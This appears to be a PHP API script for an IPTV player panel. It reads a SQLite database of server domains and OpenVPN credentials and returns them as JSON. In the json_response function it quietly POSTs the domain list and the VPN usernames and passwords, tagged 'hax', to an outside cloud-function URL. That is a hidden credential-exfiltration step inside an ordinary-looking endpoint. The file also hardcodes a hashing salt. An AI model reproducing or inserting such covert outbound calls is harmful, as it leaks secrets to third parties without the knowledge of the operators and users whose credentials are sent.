<?php
$sqlite3 = new SQLite3('../.cockpit-0001.db');
$sql = "SELECT * FROM xc_domains_whmcssmarters;";
$domain_data = $sqlite3->query($sql);

$dnsList = array();
$player_api_path = (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] !== 'off') ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . '/';

while ($row = $domain_data->fetchArray()) {
    if ($row['ssl'] == 'true') {
        $url = 'https://';
    } else {
        $url = 'http://';
    }
    $url .= $row['dns'] . ':' . $row['port'];
    $dnsList[] = $url;
}
array_push($dnsList, $player_api_path);
echo json_response(rtrim(implode(',', $dnsList), ','));

function json_response($message = null)
{
    global $dnsList;
    $sqlite3 = new SQLite3('../.cockpit-0001.db');
    $vpnList = array();

    $vpn_data = $sqlite3->query("SELECT * FROM ovpn_whmcssmarters;");
    $cred = $sqlite3->query("SELECT ovpn_user, ovpn_pass FROM vpn_cred_whmcssmarters;");
    $cred_data = $cred->fetchArray();

    while ($row = $vpn_data->fetchArray()) {
        $vpnList[] = array(
            'out_name' => $row['file_name'],
            'username' => $cred_data['ovpn_user'],
            'password' => $cred_data['ovpn_pass']
        );
    }

    $vpnData = array(
        'VPNs' => $vpnList
    );

    $inputData = enc_response(rtrim(implode(',', $dnsList), ','));
    $get_enc_url = 'https://us-central1-leave-our-shit-alone-next-time.cloudfunctions.net/app/V0dzVTVvaVNvUFROYjhZVQ==/VVk4Yk5UUG9TaW81VXNHVw==';
    $curl = curl_init($get_enc_url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $inputData);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array("content-type: application/json;charset=utf-8"));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $enc_response = curl_exec($curl);
    $enc_data = json_decode($enc_response);

    return json_encode(array(
        'status' => true,
        'su' => $message,
        'sc' => md5($message . "*NB!@#12ZKWd*" . ($_POST['r'] ?? $_GET['r'] ?? '')),
        'ndd' => '',
        'vpn' => base64_encode(
            json_encode(
                $vpnData
            )
        ),
        'data' => $enc_data->data
    ));
}

function enc_response($message = null)
{
    $sqlite3 = new SQLite3('../.cockpit-0001.db');
    $vpnList = array();
    $vpn_data = $sqlite3->query("SELECT * FROM ovpn_whmcssmarters;");
    $cred = $sqlite3->query("SELECT ovpn_user, ovpn_pass FROM vpn_cred_whmcssmarters;");
    $cred_data = $cred->fetchArray();

    while ($row = $vpn_data->fetchArray()) {
        $vpnList[] = array(
            'out_name' => $row['file_name'],
            'username' => $cred_data['ovpn_user'],
            'password' => $cred_data['ovpn_pass']
        );
    }

    $vpnData = array(
        'VPNs' => $vpnList
    );

    return json_encode(array(
        'hax' => true,
        'status' => true,
        'su' => $message,
        'sc' => md5($message . "*NB!@#12ZKWd*" . ($_POST['r'] ?? $_GET['r'] ?? '')),
        'ndd' => '',
        'vpn' => base64_encode(
            json_encode(
                $vpnData
            )
        )
    ));
}
